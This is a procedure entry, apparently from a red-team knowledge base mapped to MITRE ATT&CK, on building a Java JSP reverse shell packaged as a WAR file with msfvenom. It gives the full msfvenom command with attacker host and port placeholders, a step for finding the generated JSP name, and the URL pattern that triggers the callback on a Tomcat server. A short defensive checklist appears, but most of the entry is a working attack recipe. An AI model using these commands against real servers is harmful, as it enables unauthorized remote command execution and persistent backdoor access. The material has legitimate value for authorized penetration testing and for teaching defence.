---
id: 4004b63e-eab2-4ef0-bef9-1c090ce1dec5
name: Generate-Java-Reverse-Shell-WAR-Payload
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.629820+00:00'
updated_at: '2023-05-26T00:59:13.049187+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
  - '[[techniques/Web Service|T1102 - Web Service]]'
sub_techniques: []
tags:
  - '[[tags/Reverse Shell]]'
  - '[[tags/War]]'
  - java
  - payload
commands:
  - '[[commands/msfvenom-java-jsp-reverse-tcp-war]]'
  - '[[commands/strings-extract-jsp-name-from-war]]'
platforms:
  - Linux
  - Web
  - Java
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Generate-Java-Reverse-Shell-WAR-Payload

## Summary

This procedure outlines the creation of a Java reverse shell payload packaged as a WAR file using Metasploit's msfvenom tool. The resulting archive contains a malicious JSP that establishes a reverse TCP connection to the attacker's listener upon deployment on a vulnerable Java web server, enabling remote command execution and control.

## Description

A Java Reverse Shell Payload in WAR format targets Java-based web applications, such as those running on Apache Tomcat. By deploying the WAR file—often via file upload vulnerabilities or misconfigured management interfaces—the attacker gains a persistent backdoor. The payload initiates an outbound connection to bypass inbound firewall restrictions, allowing command execution on the server. This technique is effective in web exploitation scenarios where direct shell access is restricted, providing a stealthy command and control channel. Success depends on the target's ability to process and execute the embedded JSP.

## Requirements

1. Metasploit Framework installed with msfvenom accessible in the PATH
2. Attacker's IP address and a listening port (e.g., via netcat or Metasploit handler)
3. Access to a vulnerable Java web server supporting WAR deployment (e.g., Tomcat manager interface)
4. Basic knowledge of the target's network to ensure connectivity for the reverse connection

## Defense

- Apply security patches to Java web servers and containers like Tomcat to prevent unauthorized WAR deployments
- Enforce strict access controls on management interfaces (e.g., disable Tomcat Manager unless needed)
- Implement file upload validation to reject .war files and scan uploads for malicious content
- Monitor outbound network traffic from web servers for connections to suspicious IPs/ports and enable application logging for JSP execution

## Objectives

1. Generate a functional WAR file containing a reverse shell JSP payload
2. Extract the embedded JSP filename for post-deployment access
3. Establish remote access to the target server via the reverse connection for command execution

## Instructions

### Step 1: Generate the WAR Payload

**Context**: This step uses msfvenom to create the reverse shell payload, specifying the attacker's host and port for the callback connection. The output is redirected to a WAR file ready for deployment.

**Command** ([[commands/msfvenom-java-jsp-reverse-tcp-war]]):
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f war > reverse.war
```

> The msfvenom tool encodes the payload to evade basic detection. Expected output is a binary WAR file (no console output). Verify creation with `ls -la reverse.war` to confirm the file exists and has content.

### Step 2: Extract the JSP Filename

**Context**: WAR files contain a JSP servlet with a generated name. Extracting this name is necessary to invoke the shell after deployment, as accessing the correct endpoint triggers the reverse connection.

**Command** ([[commands/strings-extract-jsp-name-from-war]]):
```bash
strings reverse.war | grep jsp
```

> The strings command pulls printable text from the binary, and grep filters for JSP references. Expected output is a line like "shell.jsp" or a randomized name (e.g., "abc123.jsp"). Use this name in the deployment URL, such as http://target:8080/reverse/shell.jsp.
